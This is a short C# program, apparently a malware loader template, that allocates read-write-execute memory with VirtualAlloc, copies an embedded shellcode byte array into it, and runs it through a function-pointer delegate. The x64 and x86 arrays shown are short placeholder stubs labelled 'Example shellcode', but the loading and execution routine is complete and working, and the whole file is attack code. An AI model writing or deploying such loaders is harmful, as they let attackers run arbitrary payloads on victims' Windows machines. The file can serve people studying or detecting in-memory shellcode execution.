using System;
using System.Runtime.InteropServices;

class MainClass
{
    [DllImport("kernel32")]
    static extern IntPtr VirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr mode);

    //Using Windows StdCall calling convention
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate void WindowsRun();

    public static void Main(string[] args)
    {
        //Determine OS version
        OperatingSystem os = Environment.OSVersion;
        //On x86 pointer is 4 long, 8 on x64
        bool x86 = (IntPtr.Size == 4);
        byte[] payload;

        if (os.Platform == PlatformID.Win32Windows || os.Platform == PlatformID.Win32NT)
        {
            if (!x86)
            {
                //Example x64 shellcode
                payload = new byte[] {  0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                                        0x51,0x56,0x48,0x31,0xd2};
            }
            else
            {
                //Example x86 shellcode
                payload = new byte[] {  0xfc,0xe8,0x82,0x00,0x00,0x00 };
            }
            //Allocating memory for payload (1. First viable location, 2. Amount of memory to allocate,
            //                                      3. magic value tells to allocate now,4. magic value sets section to RWX)
            IntPtr ptr = VirtualAlloc(IntPtr.Zero, (IntPtr)payload.Length, (IntPtr)0x1000, (IntPtr)0x40);
            //Copying payload to memory section (1. Byte array we want to copy into section, 2. Index to copy at, 
            //                                      3. Where we wanna copy to (pointer from VirtualAlloc, 4. Bytes we wanna copy (all payload))
            Marshal.Copy(payload, 0, ptr, payload.Length);
            //Point to shellcode in memory
            WindowsRun r = (WindowsRun)Marshal.GetDelegateForFunctionPointer(ptr, typeof(WindowsRun));
            //Run
            r();
        }
    }
}